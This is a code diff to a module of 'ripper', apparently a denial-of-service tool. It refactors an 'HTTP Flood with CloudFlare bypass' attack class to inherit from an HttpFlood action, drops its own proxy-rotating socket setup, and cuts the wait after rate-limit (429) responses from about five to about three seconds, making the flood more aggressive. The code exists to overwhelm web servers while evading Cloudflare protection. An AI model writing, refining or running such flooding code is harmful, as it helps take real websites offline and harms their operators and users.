@@ -1,13 +1,12 @@
 import time
 from contextlib import suppress
-from typing import Any
 
 from cloudscraper import CloudScraper, create_scraper
 from requests import Response
 
+from ripper.actions.http_flood import HttpFlood
 from ripper.context.errors import Errors
 from ripper.context.target import Target
-from ripper.actions.attack_method import AttackMethod
 
 # Forward Reference
 Context = 'Context'
@@ -27,26 +26,16 @@ class RateLimitException(BaseException):
         return f'CODE 429: {self.message}'
 
 
-class CloudFlareBypass(AttackMethod):
+class HttpBypass(HttpFlood):
     """HTTP Flood method with CloudFlare bypass ."""
 
     name: str = 'HTTP Flood with CloudFlare bypass'
-    label: str = 'cloudflare-bypass'
+    label: str = 'http-bypass'
 
-    _target: Target
-    _ctx: Context
-    _proxy: Any = None
     _http_connect: CloudScraper = None
 
     def __init__(self, target: Target, context: Context):
-        self._target = target
-        self._ctx = context
-
-    def create_connection(self):
-        self._proxy = self._ctx.proxy_manager.get_random_proxy()
-        conn = self._ctx.sock_manager.create_tcp_socket(self._proxy)
-
-        return conn
+        super().__init__(target, context)
 
     def __call__(self, *args, **kwargs):
         browser = {
@@ -70,7 +59,7 @@ class CloudFlareBypass(AttackMethod):
                 self.check_rate_limit(response)
         except RateLimitException as e:
             self._ctx.add_error(Errors(type(e).__name__, e.__str__()))
-            time.sleep(5.01)
+            time.sleep(3.01)
         except Exception as e:
             self._ctx.add_error(Errors(type(e).__name__, e.__str__()[:128]))
             self._ctx.target.statistic.connect.status_failed()
